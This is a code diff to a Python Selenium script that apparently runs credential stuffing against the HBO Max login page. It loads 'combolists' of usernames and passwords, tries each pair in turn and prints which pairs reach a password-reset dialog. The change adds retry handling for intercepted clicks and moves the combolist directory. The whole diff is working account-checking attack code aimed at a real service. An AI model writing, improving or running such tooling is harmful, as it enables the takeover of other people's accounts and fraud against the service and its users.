@@ -2,6 +2,7 @@ import time
 import os
 
 from combo_splitters.split_combos import ComboSplitter
+from selenium.common.exceptions import ElementClickInterceptedException
 from modules.connection_error import connection_error_try_block as ip_country
 from selenium.webdriver.chrome.options import Options
 from pyshadow.main import Shadow
@@ -14,7 +15,7 @@ from pathlib import Path
 def hbo():
 	ip_country('hbo')
 	title()
-	file_directory = str(Path(__file__).parents[1]) + '/combolists/combos/hbo'
+	file_directory = str(Path(__file__).parents[1]) + '/combolists/hbo'
 	plain_directory = str(Path(__file__).parents[1])
 	page = 'https://auth.max.com/login'
 	iframe = ''
@@ -63,6 +64,8 @@ def hbo():
 				if shadows.find_elements("gi-compromised-password[class='hydrated']"):
 					print(' | {}:{} ---> Password Reset Dialog'.format(users[index], passwords[index]))
 				index += 1
+			except ElementClickInterceptedException:
+				print(' | {}:{} ---> Intercepted, trying this combo again'.format(users[index], passwords[index]))
 			except Exception as e:
 				print(e)
 				exit()
